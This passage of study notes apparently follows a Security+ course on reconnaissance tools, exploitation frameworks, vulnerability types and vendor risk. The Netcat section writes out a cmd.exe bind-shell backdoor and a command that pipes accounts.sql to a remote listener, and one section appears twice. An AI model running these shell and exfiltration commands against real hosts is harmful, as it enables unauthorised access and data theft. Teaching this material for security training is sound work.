-   pathping—provides statistics for latency and packet loss along a route over a longer measuring period. pathping is a Windows tool; the equivalent on Linux is mtr  **( Rogue host is modifying traffic before forwarding it, with the side effect of increasing network latency)**.

In a security context, high latency at the default gateway compared to a baseline might indicate a man-in-the-middle attack. High latency on other hops could be a sign of denial of service, or could just indicate network congestion.

In Linux, commands such as ifconfig, arp, route, and traceroute are deprecated and the utilities have not been updated for some years. The iproute2 suite of tools supply replacements for these commands ([digitalocean.com/community/tutorials/how-to-use-iproute2-tools-to-manage-network-configuration-on-a-linux-vps](https://www.digitalocean.com/community/tutorials/how-to-use-iproute2-tools-to-manage-network-configuration-on-a-linux-vps)).
## IP SCANNERS AND NMAP

Scanning a network using tools such as ping is time consuming and non-stealthy, and does not return detailed results. Most topology discovery is performed using a dedicated IP scanner tool. An IP scanner performs host discovery and identifies how the hosts are connected together in an internetwork. For auditing, there are enterprise suites, such as Microsoft's System Center products. Such suites can be provided with credentials to perform authorized scans and obtain detailed host information via management protocols, such as the Simple Network Management Protocol (SNMP).

The Nmap Security Scanner ([nmap.org](https://nmap.org/)) is one of the most popular open-source IP scanners. Nmap can use diverse methods of host discovery, some of which can operate stealthily and serve to defeat security mechanisms such as firewalls and intrusion detection. The tool is open-source software with packages for most versions of Windows, Linux, and macOS. It can be operated with a command line or via a GUI (Zenmap) **(Used for fingerprinting)**.

The basic syntax of an Nmap command is to give the IP subnet (or IP host address) to scan. When used without switches like this, the default behavior of Nmap is to ping and send a TCP ACK packet to ports 80 and 443 to determine whether a host is present. On a local network segment, Nmap will also perform ARP and ND (Neighbor Discovery) sweeps. If a host is detected, Nmap performs a port scan against that host to determine which services it is running.

![Screenshot of 7 IP addresses in the left pane that begin with 10.1.0; the right pane lists the MAC address for each host and whether the host is up.](https://s3.amazonaws.com/wmx-api-production/courses/5731/images/1833-1599771794816.png)

Nmap default scan listing open ports from within the default range. (Screenshot Nmap [nmap.org](https://nmap.org/).)

This OS #fingerprinting can be time-consuming on a large IP scope and is also non-stealthy. If you want to perform only host discovery, you can use Nmap with the -sn switch (or -sP in earlier versions) to suppress the port scan.
## SERVICE DISCOVERY AND NMAP

Having identified active IP hosts on the network and gained an idea of the network topology, the next step in network reconnaissance is to work out which operating systems are in use, which network services each host is running, and, if possible, which application software is underpinning those services. This process is described as service discovery. Service discovery can also be used defensively, to probe potential rogue systems and identify the presence of unauthorized network service ports.

### Service Discovery with Nmap

When Nmap completes a host discovery scan, it will report on the state of each port scanned for each IP address in the scope. At this point, you can run additional service discovery scans against one or more of the active IP addresses. Some of the principal options for service discovery scans are:

-   TCP SYN (-sS)—this is a fast technique also referred to as half-open scanning, as the scanning host requests a connection without acknowledging it. The target's response to the scan's SYN packet identifies the port state.
-   UDP scans (-sU)—scan UDP ports. As these do not use ACKs, Nmap needs to wait for a response or timeout to determine the port state, so UDP scanning can take a long time. A UDP scan can be combined with a TCP scan.
-   Port range (-p)—by default, Nmap scans 1000 commonly used ports, as listed in its configuration file. Use the -p argument to specify a port range.

### Service and Version Detection and OS Fingerprinting with Nmap

The detailed analysis of services on a particular host is often called fingerprinting. This is because each OS or application software that underpins a network service responds to probes in a unique way. This allows the scanning software to guess at the software name and version, without having any sort of privileged access to the host. This can also be described as banner grabbing, where the banner is the header of the response returned by the application.

When services are discovered, you can use Nmap with the -sV or -A switch to probe a host more intensively to discover the following information:

-   Protocol—do not assume that a port is being used for its "well known" application protocol. Nmap can scan traffic to verify whether it matches the expected signature (HTTP, DNS, SMTP, and so on).
-   Application name and version—the software operating the port, such as Apache web server or Internet Information Services (IIS) web server.
-   OS type and version—use the -O switch to enable OS fingerprinting (or -A to use both OS fingerprinting and version discovery).
-   Device type—not all network devices are PCs. Nmap can identify switches and routers or other types of networked devices, such as NAS boxes, printers, and webcams.

Nmap fingerprinting scan results.

Nmap comes with a database of application and version fingerprint signatures, classified using a standard syntax called Common Platform Enumeration (CPE). Unmatched responses can be submitted to a web URL for analysis by the community .
## NETSTAT AND NSLOOKUP

Basic service discovery tasks can also be performed using tools built into the Windows and Linux operating systems:

-   netstat—show the state of TCP/UDP ports on the local machine. The same command is used on both Windows and Linux, though with different options syntax. You can use netstat to check for service misconfigurations (perhaps a host is running a web or FTP server that a user installed without authorization). You may also be able to identify suspect remote connections to services on the local host or from the host to remote IP addresses. If you are attempting to identify malware, the most useful netstat output is to show which process is listening on which ports **(Suspicious network traffic check TCP port)**. 

![The first 2 items in the list are "TCP 10.1.0.1:80 ROGUE:1415 TIME_WAIT" and "TCP 10.1.0.1:80 GATEWAY:49161 ESTABLISHED"; 9 similar items follow.](https://s3.amazonaws.com/wmx-api-production/courses/5731/images/7383-1599771794926.png)

netstat command running on Windows showing activity during an nmap scan. The findstr function is being used to filter the output (to show only connections from IPv4 hosts on the same subnet). (Screenshot used with permission from Microsoft.)

Command line output from netstat –ano.

On Linux, use of netstat is deprecated in favor of the ss **(Suspicious network traffic check TCP port)** command from the iptools2 suite ([linux.com/topic/networking/introduction-ss-command](https://www.linux.com/topic/networking/introduction-ss-command/)).

-   nslookup/dig—query name records for a given domain using a particular DNS resolver. Under Windows (nslookup) or Linux (nslookup/dig). An attacker may test a network to find out if the DNS service is misconfigured. A misconfigured DNS may allow a **zone transfer, which will give the attacker the complete records of every host in the domain, revealing a huge amount about the way the network is configured**. 

![Screenshot shows "*** Can't list domain comptia.org: Query refused".](https://s3.amazonaws.com/wmx-api-production/courses/5731/images/9882-1599771794985.png)
## OTHER RECONNAISSANCE AND DISCOVERY TOOLS

There are hundreds of tools relevant to security assessments, network reconnaissance, vulnerability scanning, and penetration testing. Security distributions specialize in bundling these tools for Linux—notably KALI ([kali.org](https://www.kali.org/)) plus ParrotOS ([parrotlinux.org](https://parrotlinux.org/))—and Windows ([fireeye.com/blog/threat-research/2019/03/commando-vm-windows-offensive-distribution.html](https://www.fireeye.com/blog/threat-research/2019/03/commando-vm-windows-offensive-distribution.html)).

### theHarvester

theHarvester is a tool for gathering open-source intelligence (OSINT) for a particular domain or company name ([github.com/laramies/theHarvester](https://github.com/laramies/theHarvester)). It works by scanning multiple public data sources to gather emails, names, subdomains, IPs, URLs and other relevant data.

### dnsenum

While you can use tools such as dig and whois to query name records and hosting details and to check that external DNS services are not leaking too much information, a tool such as dnsenum packages a number of tests into a single query ([github.com/fwaeytens/dnsenum](https://github.com/fwaeytens/dnsenum)). As well as hosting information and name records, dnsenum can try to work out the IP address ranges that are in use #zone_transfer.

### scanless

Port scanning is difficult to conceal from detection systems, unless it is performed slowly and results are gathered over an extended period. Another option is to disguise the source of probes. To that end, scanless is a tool that uses third-party sites ([github.com/vesche/scanless](https://github.com/vesche/scanless)). This sort of tool is also useful in a defensive sense, by scanning for ports and services that are open but shouldn't be.

### curl

curl is a command line client for performing data transfers over many types of protocol ([curl.haxx.se](https://curl.haxx.se/)). This tool can be used to submit HTTP GET, POST, and PUT requests as part of web application vulnerability testing. curl supports many other data transfer protocols, including FTP, IMAP, LDAP, POP3, SMB, and SMTP.

### Nessus

The list of services and version information that a host is running can be cross-checked against lists of known software vulnerabilities. This type of scanning is usually performed using automated tools. Nessus, produced by Tenable Network Security ([tenable.com/products/nessus/nessus-professional](https://www.tenable.com/products/nessus/nessus-professional)), is one of the best-known commercial #vulnerability_scanners. It is available in on-premises (Nessus Manager) and cloud (Tenable Cloud) versions, as well as a Nessus Professional version, designed for smaller networks. The product is free to use for home users but paid for on a subscription basis for enterprises. As a previously open-source program, Nessus also supplies the source code for many other scanners.
## PACKET CAPTURE AND TCPDUMP 

Packet and protocol analysis is another crucial security assessment and monitoring process:

-   Packet analysis refers to deep-down frame-by-frame scrutiny of captured frames.
-   Protocol analysis means using statistical tools to analyze a sequence of packets, or packet trace.

Packet and protocol analysis depends on a sniffer tool to capture and decode the frames of data. Network traffic can be captured from a host or from a network segment. Using a host means that only traffic directed at that host is captured. Capturing from a network segment can be performed by a switched port analyzer (SPAN) port (or mirror port). This means that a network switch is configured to copy frames passing over designated source ports to a destination port, which the packet sniffer is connected to. Sniffing can also be performed over a network cable segment by using a test access port (TAP). This means that a device is inserted in the cabling to copy frames passing over it. There are passive and active (powered) versions.

Typically, sniffers are placed inside a firewall or close to a server of particular importance. The idea is usually to identify malicious traffic that has managed to get past the firewall. A single sniffer can generate an exceptionally large amount of data, so you cannot just put multiple sensors everywhere in the network without provisioning the resources to manage them properly. Depending on network size and resources, one or just a few sensors will be deployed to monitor key assets or network paths.

tcpdump is a command line packet capture utility for Linux ([linux.die.net/man/8/tcpdump](https://linux.die.net/man/8/tcpdump)). The basic syntax of the command is tcpdump -i eth0, where eth0 is the interface to listen on. The utility will then display captured packets until halted manually (Ctrl+C). Frames can be saved to a .pcap file using the -w option. Alternatively, you can open a pcap file using the -r option.

tcpdump is often used with some sort of filter expression to reduce the number of frames that are captured:

-   Type—filter by host, net, port, or portrange.
-   Direction—filter by source (src) or destination (dst) parameters (host, network, or port).
-   Protocol—filter by a named protocol rather than port number (for example, arp, icmp, ip, ip6, tcp, udp, and so on).

Filter expressions can be combined by using Boolean operators:

-   and (&&)
-   or (||)
-   not (!)

Filter syntax can be made even more detailed by using parentheses to group expressions. A complex filter expression should be enclosed by quotes. For example, the following command filters frames to those with the source IP 10.1.0.100 and destination port 53 or 80:

==tcpdump -i eth0 "src host 10.1.0.100 and (dst port 53 or dst port 80)=="
## PACKET ANALYSIS AND WIRESHARK

A protocol analyzer (or packet analyzer) works in conjunction with a sniffer to perform traffic analysis. You can either analyze a live capture or open a saved capture (.pcap) file. Protocol analyzers can decode a captured frame to reveal its contents in a readable format. You can choose to view a summary of the frame or choose a more detailed view that provides information on the OSI layer, protocol, function, and data.

Wireshark ([wireshark.org](https://www.wireshark.org/)) is an open-source graphical packet capture and analysis utility, with installer packages for most operating systems. Having chosen the interface to listen on, the output is displayed in a three-pane view. The packet list pane shows a scrolling summary of frames. The packet details pane shows expandable fields in the frame currently selected from the packet list. The packet bytes pane shows the raw data from the frame in hex and ASCII. Wireshark is capable of parsing (interpreting) the headers and payloads of hundreds of network protocols.

You can apply a capture filter using the same expression syntax as tcpdump (though the expression can be built via the GUI tools too). You can save the output to a .pcap file or load a file for analysis. Wireshark supports very powerful display filters ([wiki.wireshark.org/DisplayFilters](https://wiki.wireshark.org/DisplayFilters)) that can be applied to a live capture or to a capture file. You can also adjust the coloring rules ([wiki.wireshark.org/ColoringRules](https://wiki.wireshark.org/ColoringRules)), which control the row shading and font color for each frame.

![Screenshot shows list of items with headings No., Time, Source, Destination, Protocol, Length, Info. Highlighted item is further detailed in 2 panes.](https://s3.amazonaws.com/wmx-api-production/courses/5731/images/8605-1599771795036.png)

Wireshark protocol analyzer. (Screenshot used with permission from wireshark.org.)

Wireshark output of a packet analysis. (Screenshot used with permission from wireshark.org.)

Another useful option is to use the **Follow TCP Stream** context command to reconstruct the packet contents for a TCP session.

The PCAP file format has some limitations, which has led to the development of PCAP Next Generation (PCAPNG). Wireshark now uses PCAPNG by default, and tcpdump can process files in the new format too ([cloudshark.io/articles/5-reasons-to-move-to-pcapng](https://cloudshark.io/articles/5-reasons-to-move-to-pcapng/)).
## PACKET INJECTION AND REPLAY

Some reconnaissance techniques and tests depend on sending forged or spoofed network traffic. Often, network sniffing software libraries allow frames to be inserted (or injected) into the network stream. There are also tools that allow for different kinds of packets to be crafted and manipulated. Well-known tools used for packet injection include Dsniff ([monkey.org/~dugsong/dsniff](https://monkey.org/~dugsong/dsniff/)), Ettercap ([ettercap-project.org](https://www.ettercap-project.org/)), Scapy ([scapy.net](https://scapy.net/)), and hping ([hping.org](http://hping.org/)).

### hping 

hping is an open-source spoofing tool that provides a penetration tester with the ability to craft network packets to exploit vulnerable firewalls and IDSs. hping can perform the following types of test **(Used for fingerprinting)**:

-   Host/port detection and firewall testing—like Nmap, hping can be used to probe IP addresses and TCP/UDP ports for responses.
-   Traceroute—if ICMP is blocked on a local network, hping offers alternative ways of mapping out network routes. hping can use arbitrary packet formats, such as probing DNS ports using TCP or UDP, to perform traces.
-   Denial of service (DoS)—hping can be used to perform flood-based DoS attacks from randomized source IPs. This can be used in a test environment to determine how well a firewall, IDS, or load balancer responds to such attacks.

### tcpreplay

As the name suggests, tcpreplay takes previously captured traffic that has been saved to a .pcap file and replays it through a network interface ([linux.die.net/man/1/tcpreplay](https://linux.die.net/man/1/tcpreplay)). Optionally, fields in the capture can be changed, such as substituting MAC or IP addresses. tcpreplay is useful for analysis purposes. If you have captured suspect traffic, you can replay it through a monitored network interface to test intrusion detection rules #malicious_traffic_sample.
## EXPLOITATION FRAMEWORKS

A remote access trojan (RAT) is malware that gives an adversary the means of remotely accessing the network. From the perspective of security posture assessment, a penetration tester might want to try to establish this sort of connection and attempt to send corporate information over the channel (data exfiltration). If security controls are working properly, this attempt should be defeated (or at least detected). 

An exploitation framework uses the vulnerabilities identified by an automated scanner and launches scripts or software to attempt to deliver matching exploits. This might involve considerable disruption to the target, including service failure, and risk data security.

The framework comprises a database of exploit code, each targeting a particular CVE (Common Vulnerabilities and Exposures). The exploit code can be coupled with modular payloads. Depending on the access obtained via the exploit, the payload code may be used to open a command shell, create a user, install software, and so on. The custom exploit module can then be injected into the target system. The framework may also be able to obfuscate the code so that it can be injected past an intrusion detection system or antivirus software.

The best-known exploit framework is Metasploit ([metasploit.com](https://www.metasploit.com/)). The platform is open-source software, now maintained by Rapid7. There is a free framework (command line) community edition with installation packages for Linux and Windows. Rapid7 produces pro and express commercial editions of the framework and it can be closely integrated with the Nexpose vulnerability scanner.

![Text includes "Easy phishing: Set up email templates, landing pages and listeners in Metasploit Pro… 1611 exploits… 471 payloads… Free...trial..."](https://s3.amazonaws.com/wmx-api-production/courses/5731/images/3058-1599771795118.png)

Metasploit Framework Console. (Screenshot used with permission from [metasploit.com](https://www.metasploit.com/).)

Sn1per ([github.com/1N3/Sn1per](https://github.com/1N3/Sn1per)) is a framework designed for penetration test reporting and evidence gathering. It can integrate with other tools such as Metasploit and Nikto to run automated suites of tests. Results can be displayed as web reports. 

There are many other exploitation frameworks targeting different kinds of vulnerabilities. Some examples include:

-   fireELF—injecting fileless exploit payloads into a Linux host ([github.com/rek7/fireELF](https://github.com/rek7/fireELF)).
-   RouterSploit—vulnerability scanning and exploit modules targeting embedded systems ([github.com/threat9/routersploit](https://github.com/threat9/routersploit)).
-   Browser Exploitation Framework (BeEF)—recovering web session information and exploiting client-side scripting ([beefproject.com](https://beefproject.com/)).
-   Zed Attack Proxy (ZAP)—scanning tools and scripts for web application and mobile app security testing ([owasp.org/www-project-zap](https://owasp.org/www-project-zap/)).
-   Pacu—scanning and exploit tools for reconnaissance and exploitation of Amazon Web Service (AWS) accounts ([rhinosecuritylabs.com/aws/pacu-open-source-aws-exploitation-framework](https://rhinosecuritylabs.com/aws/pacu-open-source-aws-exploitation-framework/)).

## NETCAT

One simple but effective tool for testing connectivity is Netcat (nc), available for both Windows and Linux. Netcat is a computer networking utility for reading and writing raw data over a network connection, and can be used for port scanning and #fingerprinting. For example, the following command attempts to connect to the HTTP port on a server and return any banner by sending the "head" HTTP keyword: **(To check for if it's possible to open a network connection to a remote host over a given port#)** 

echo "head" | nc 10.1.0.1 -v 80

Netcat can also establish connections with remote machines. To configure Netcat as a backdoor, you first set up a listener on the victim system (IP: 10.1.0.1) set to pipe traffic from a program, such as the command interpreter, to its handler:

nc -l -p 666 -e cmd.exe

The following command connects to the listener and grants access to the terminal:

nc 10.1.0.1 666

Used the other way around, Netcat can be used to receive files. For example, on the target system the attacker runs the following:

type accounts.sql | nc 10.1.0.192 6666

On the handler (IP 10.1.0.192), the attacker receives the file using the following command:

nc -l -p 6666 > accounts.sql

# 3B
## EXAM OBJECTIVES COVERED

1.6 Explain the security concerns associated with various types of vulnerabilities( #vulnerability  )

Performing a security assessment effectively is not simply a matter of choosing appropriate tools. You need to understand the types of vulnerabilities that affect information systems and networks. You must also be able to evaluate and explain the impacts that can arise from vulnerabilities, so that assessment and remediation activities can be given priority where they are most needed.

## SOFTWARE VULNERABILITIES AND PATCH MANAGEMENT
Software exploitation means an attack that targets a vulnerability in software code. An application vulnerability is a design flaw that can cause the security system to be circumvented or that will cause the application to crash. Typically, vulnerabilities can only be exploited in quite specific circumstances but because of the complexity of modern software and the speed with which new versions must be released to market, almost no software is free from vulnerabilities. As two contrasting examples, consider vulnerabilities affecting Adobe's PDF document reader versus a vulnerability in the server software underpinning transport security. The former could give a threat actors a foothold on a corporate network via a workstation; the latter could expose the cryptographic keys used to provide secure web services to compromise. Both are potentially high impact for different reasons.

It is also important to realize that software vulnerabilities affect all types of code, not just applications:

-   Operating system (OS)—an application exploit will run with the permissions of the logged on user, which will hopefully be limited. A vulnerability in an OS kernel file or shared library is more likely to allow privilege escalation, where the malware code runs with higher access rights (system or root). Dirty COW is one example of a Linux kernel vulnerability ([access.redhat.com/blogs/766093/posts/2757141](https://access.redhat.com/blogs/766093/posts/2757141)).
-   Firmware—vulnerabilities can exist in the BIOS/UEFI firmware that controls the boot process for PCs. There can also be bugs in device firmware, such as network cards and disk controllers. Finally, network appliances and Internet of Things (IoT) devices run OS code as a type of firmware. Like kernel vulnerabilities, firmware exploits can be difficult to identify, because the exploit code can run with the highest level of privilege. The Intel AMT vulnerability illustrates the impacts of a firmware vulnerability ([blackhat.com/docs/us-17/thursday/us-17-Evdokimov-Intel-AMT-Stealth-Breakthrough-wp.pdf](https://wmx-api-production.s3.amazonaws.com/courses/5731/supplementary/us-17-Evdokimov-Intel-AMT-Stealth-Breakthrough-wp.pdf)).

Most vulnerabilities are discovered by software and security researchers, who notify the vendor to give them time to patch the vulnerability before releasing details to the wider public. Improper or weak patch management is an additional layer of vulnerability where these security patches are not applied to systems, leaving them vulnerable to exploits. Poor configuration management may mean that the organization is simply not documenting and managing its assets rigorously. Patches may be deployed to some systems, but not others. Patches may be applied and then removed because they cause performance issues.
## ZERO-DAY AND LEGACY PLATFORM VULNERABILITIES

Even if effective patch management procedures are in place, attackers may still be able to use software vulnerabilities as an attack vector. A vulnerability that is exploited before the developer knows about it or can release a patch is called a zero-day. These can be extremely destructive, as it can take the vendor some time to develop a patch, leaving systems vulnerable in the interim.

The term zero-day is usually applied to the vulnerability itself but can also refer to an attack or malware that exploits it. The EternalBlue zero-day exploit makes for an instructive case study ([wired.com/story/eternalblue-leaked-nsa-spy-tool-hacked-world](https://www.wired.com/story/eternalblue-leaked-nsa-spy-tool-hacked-world/)).

Zero-day vulnerabilities have significant financial value. A zero-day exploit for a mobile OS can be worth millions of dollars. Consequently, an adversary will only use a zero-day vulnerability for high value attacks. State security and law enforcement agencies are known to stockpile zero-days to facilitate the investigation of crimes.

A legacy platform is one that is no longer supported with security patches by its developer or vendor. This could be a PC/laptop/smartphone, networking appliance, peripheral device, Internet of Things device, operating system, database/programming environment, or software application. By definition, legacy platforms are unpatchable. Such systems are highly likely to be vulnerable to exploits and must be protected by security controls other than patching, such as isolating them to networks that an attacker cannot physically connect to.
## WEAK HOST CONFIGURATIONS

While ineffective patch and configuration management policies and procedures represent one type of vulnerability, #weak_configurations can have similar impacts.

### Default Settings #Vulnerability 

Relying on the manufacturer default settings when deploying an appliance or software applications is one example of weak configuration. It is not sufficient to rely on the vendor to ship products in a default-secure configuration, though many now do. Default settings may leave unsecure interfaces enabled that allow an attacker to compromise the device. Network appliances with weak settings can allow attackers to move through the network unhindered and snoop on traffic.

### Unsecured Root Accounts 

The root account, referred to as the default Administrator account in Windows or generically as the superuser, has no restrictions set over system access. A superuser account is used to install the OS. An unsecured root account is one that an adversary is able to gain control of, either by guessing a weak password or by using some local boot attack to set or change the password. Software bugs can also allow root access, such as one affecting MacOS ([arstechnica.com/information-technology/2017/11/macos-bug-lets-you-log-in-as-admin-with-no-password-required](https://arstechnica.com/information-technology/2017/11/macos-bug-lets-you-log-in-as-admin-with-no-password-required/)). These vulnerabilities are extremely serious as they give the threat actor complete control of the system.

Effective user management and authorization policies should be enforced so that the superuser account is highly restricted and administration tasks are performed by least privilege management accounts or roles instead. The default root or Administrator account is usually disabled for login. Even if this type of account is enabled for local (interactive) login, it should not be accessible via remote login mechanisms.

### Open Permissions

Open permissions refers to provisioning data files or applications without differentiating access rights for user groups. Permissions systems can be complex and it is easy to make mistakes, such as permitting unauthenticated guests to view confidential data files, or allowing write access when only read access is appropriate. This issue is particularly prevalent on cloud storage, where administrators used to Windows and Linux directory access control lists may be unfamiliar with the cloud equivalents ([directdefense.com/how-to-prevent-exploitation-of-amazon-s3-buckets-with-weak-permissions](https://www.directdefense.com/how-to-prevent-exploitation-of-amazon-s3-buckets-with-weak-permissions/)).
## WEAK NETWORK CONFIGURATIONS

Vulnerabilities can also arise from running unnecessary services or using weak encryption.

### Open Ports and Services

Network applications and services allow client connections via Transport Control Protocol (TCP) or User Datagram Protocol (UDP) port numbers. The clients and servers are identified by Internet Protocol (IP) addresses. Servers must operate with at least some open ports, but security best practice dictates that these should be restricted to only necessary services. Running unnecessary open ports and services increases the attack surface. Some generic steps to harden services to meet a given role include:

-   If the service is security-critical (such as a remote administration interface), restrict endpoints that are allowed to access the service by IP address or address range. Alternatively, prevent suspect endpoints from connecting by adding them to the block list, but otherwise allow access.
-   Disable services that are installed by default but that are not needed. Ideally, disable the service on the server itself, but in some circumstances it may be necessary to block the port using a firewall instead.
-   For services that should only be available on the private network, block access to ports at border firewalls or segment the network so that the servers cannot be accessed from external networks.

### Unsecure Protocols

An unsecure protocol is one that transfers data as cleartext; that is, the protocol does not use encryption for data protection. Lack of encryption also means that there is no secure way to authenticate the endpoints. This allows an attacker to intercept and modify communications, acting as man-in-the-middle (MITM).

### Weak Encryption

Encryption algorithms protect data when it is stored on disk or transferred over a network. Encrypted data should only be accessible to someone with the correct decryption key. Weak encryption vulnerabilities allow unauthorized access to data. Such vulnerabilities arise in the following circumstances:

-   The key is generated from a simple password, making it vulnerable to guessing attempts by brute-force enumeration (if the password is too short) or dictionary enumeration (if the password is not complex).
-   The algorithm or cipher used for encryption has known weaknesses that allow brute-force enumeration.
-   The key is not distributed securely and can easily fall into the hands of people who are not authorized to decrypt the data.

### Errors

Weakly configured applications may display unformatted error messages under certain conditions. These error messages can be revealing to threat actors probing for vulnerabilities and coding mistakes. Secure coding practices should ensure that if an application fails, it does so "gracefully" without revealing information that could assist the development of an exploit.
WEAK NETWORK CONFIGURATIONS

Vulnerabilities can also arise from running unnecessary services or using weak encryption.

### Open Ports and Services

Network applications and services allow client connections via Transport Control Protocol (TCP) or User Datagram Protocol (UDP) port numbers. The clients and servers are identified by Internet Protocol (IP) addresses. Servers must operate with at least some open ports, but security best practice dictates that these should be restricted to only necessary services. Running unnecessary open ports and services increases the attack surface. Some generic steps to harden services to meet a given role include:

-   If the service is security-critical (such as a remote administration interface), restrict endpoints that are allowed to access the service by IP address or address range. Alternatively, prevent suspect endpoints from connecting by adding them to the block list, but otherwise allow access.
-   Disable services that are installed by default but that are not needed. Ideally, disable the service on the server itself, but in some circumstances it may be necessary to block the port using a firewall instead.
-   For services that should only be available on the private network, block access to ports at border firewalls or segment the network so that the servers cannot be accessed from external networks.

### Unsecure Protocols

An unsecure protocol is one that transfers data as cleartext; that is, the protocol does not use encryption for data protection. Lack of encryption also means that there is no secure way to authenticate the endpoints. This allows an attacker to intercept and modify communications, acting as man-in-the-middle (MITM).

### Weak Encryption

Encryption algorithms protect data when it is stored on disk or transferred over a network. Encrypted data should only be accessible to someone with the correct decryption key. Weak encryption vulnerabilities allow unauthorized access to data. Such vulnerabilities arise in the following circumstances:

-   The key is generated from a simple password, making it vulnerable to guessing attempts by brute-force enumeration (if the password is too short) or dictionary enumeration (if the password is not complex).
-   The algorithm or cipher used for encryption has known weaknesses that allow brute-force enumeration.
-   The key is not distributed securely and can easily fall into the hands of people who are not authorized to decrypt the data.

### Errors

Weakly configured applications may display unformatted error messages under certain conditions. These error messages can be revealing to threat actors probing for vulnerabilities and coding mistakes. Secure coding practices should ensure that if an application fails, it does so "gracefully" without revealing information that could assist the development of an exploit.
## IMPACTS FROM VULNERABILITIES

Vulnerabilities can lead to various data breach and data loss scenarios. These events can have serious impacts in terms of costs and damage to the organization's reputation.

### Data Breaches and Data Exfiltration Impacts

All information should be collected, stored, and processed by authenticated users and hosts subject to the permissions (authorization) allocated to them by the data owner. Data breach and data exfiltration describe two types of event where unauthorized information use occurs:

-   A _data breach event_ is where confidential data is read, transferred, modified, or deleted without authorization. A privacy breach is where personal data is not collected, stored, or processed in full compliance with the laws or regulations governing personal information. A breach can also be described as a data leak. A data breach can be intentional/malicious or unintentional/accidental.
-   _Data exfiltration_ is the methods and tools by which an attacker transfers data without authorization from the victim's systems to an external network or media. Unlike a data breach, a data exfiltration event is always intentional and malicious. A data breach is a consequence of a data exfiltration event.

Data breach includes a wide range of scenarios with different levels of impact. The most severe data breaches compromise valuable intellectual property (IP) or the personal information of account holders.

### Identity Theft Impacts

A privacy breach may allow the threat actor to perform identity theft or to sell the data to other malicious actors. The threat actor may obtain account credentials or might be able to use personal details and financial information to make fraudulent credit applications and purchases.

### Data Loss and Availability Loss Impacts

Compared to data breaches, data loss is where information becomes unavailable, either permanently or temporarily. Availability is sometimes overlooked as a security attribute compared to confidentiality and integrity, but it can have severe impacts on business workflows. If processing systems are brought down by accidental or malicious disaster events, a company may not be able to perform crucial workflows like order processing and fulfillment. 

Some definitions of data breach focus on the unauthorized release of information, while others include loss of information, such as encryption of a database by ransomware. The events that constitute a data breach are often specified in legislation or regulations, which will also impose requirements to notify stakeholders.

### Financial and Reputation Impacts

All these impacts can have direct financial impacts due to damages, fines, and loss of business. Data/privacy breach and availability loss events will also cause a company's reputation to drop with direct customers. Major events might cause widespread adverse publicity on social media and mainstream media. In anticipation of these impacts, incident handling teams should include public relations (PR) and marketing expertise to minimize reputational damage.
## THIRD-PARTY RISKS

High-profile breaches have led to a greater appreciation of the importance of the supply chain in vulnerability management. A product, or even a service, may have components created and maintained by a long chain of different companies. Each company in the chain depends on its suppliers or vendors performing due diligence on their vendors. A weak link in the chain could cause impacts on service availability and performance, or in the worst cases lead to data breaches.

### Vendor Management

Vendor management is a process for selecting supplier companies and evaluating the risks inherent in relying on a third-party product or service. When it comes to data and cybersecurity, you must understand that risks cannot be wholly transferred to the vendor. If a data storage vendor suffers a data breach, you may be able to claim costs from them, but your company will still be held liable in terms of legal penalties and damage to reputation. If your webstore suffers frequent outages because of failures at a hosting provider, it is your company's reputation that will suffer and your company that will lose orders because customers look elsewhere.

A vendor may supply documentation and certification to prove that it has implemented a security policy robustly. You might be able to see evidence of security capabilities, such as a history of effective vulnerability management and product support. Larger companies will usually ask vendors to complete a detailed audit process to ensure that they meet the required standards.

Within vendor management, _system integration_ refers to the process of using components/services from multiple vendors to implement a business workflow. For example, a workflow allowing customers to make online purchases might involve the storefront product, a web application firewall, cloud data processing and analytics, plus integration with on-premises accounting and customer relationship management (CRM) and support ticketing systems. The contracting company may have a list of preferred vendors and ask a third-party systems integrator to build and support the solution. Alternatively, systems integration might be fully outsourced, with the third-party integrator also selecting their preferred vendors for the component parts. The principal risk in both these scenarios is that the contracting company does not have sufficient expertise to oversee the project and places too much trust in the third-party integrator.

When a vendor has become deeply embedded within a workflow, lack of vendor support can have serious impacts, as retooling the workflow to use a different vendor can be a long and complex process. Vendors may become unsupportive for any number of reasons. For example, their company might be growing too quickly and resources are spread too thinly, they may drop support for products that are not profitable, they may have overstated capabilities in terms of security, and so on. The key point for vendor management is to assess these risks when determining whether to outsource all or part of a workflow and to have contingency plans if a vendor does not perform as expected.

### Outsourced Code Development

The problem of effective oversight is particularly pertinent to outsourced code development. Many companies do not have in-house programming expertise, but without such expertise it is hard to ensure that contractors are delivering secure code. A solution is to use one vendor for development and a different vendor for vulnerability and penetration testing.

### Data Storage

There are two main scenarios for risks to data when using third parties. First, you may need to grant vendor access to your data, and second, you may use a vendor to host data or data backups and archives. The following general precautions should be taken:

-   Ensure the same protections for data as though it were stored on-premises, including authorization and access management and encryption.
-   Monitor and audit third-party access to data storage to ensure it is being used only in compliance with data sharing agreements and nondisclosure agreements.
-   Evaluate compliance impacts from storing personal data on a third-party system, such as a cloud provider or backup/archive management service.

### Cloud-Based versus On-Premises Risks

On-premises risks refer to software vulnerabilities, weak configurations, and third-party issues arising from hosts, servers, routers, switches, access points, and firewalls located on a private network installed to private offices or campus buildings. Many companies use cloud services to fully or partly support business workflows. The third-party vendor management, code, and data storage risks discussed previously apply directly to cloud as well as to on-premises. Software and weak configuration risks can also apply, however. They are not the sole responsibility of the cloud service provider (CSP). Clouds operate a shared responsibility model. This means that the cloud service provider is responsible for the security of the cloud, while the cloud consumer is responsible for security in the cloud. The types of software and configuration vulnerabilities that you must assess and monitor vary according to the nature of the service.
# 3C
## EXAM OBJECTIVES COVERED

1.7 Summarize the techniques used in security assessments

Automated vulnerability scanning is a key part of both initial security assessment and ongoing compliance monitoring. You should be able to summarize types of scanners and explain the impact of scan configurations. You should also be able to contribute to threat hunting security assessments and explain how they can be supported by threat intelligence platforms.

## SECURITY ASSESSMENTS

Network reconnaissance and discovery is used to identify hosts, network topology, and open services/ports, establishing an overall attack surface. Various types of security assessments can be used to test these hosts and services for vulnerabilities. There are many models and frameworks for conducting security assessments. A good starting point is NIST's Technical Guide to Information Security Testing and Assessment ([nvlpubs.nist.gov/nistpubs/Legacy/SP/nistspecialpublication800-115.pdf](https://wmx-api-production.s3.amazonaws.com/courses/5731/supplementary/nistspecialpublication800-115.pdf)). SP 800-115 identifies three principal activities within an assessment:

-   Testing the object under assessment to discover vulnerabilities or to prove the effectiveness of security controls.
-   Examining assessment objects to understand the security system and identify any logical weaknesses. This might highlight a lack of security controls or a common misconfiguration.
-   Interviewing personnel to gather information and probe attitudes toward and understanding of security.

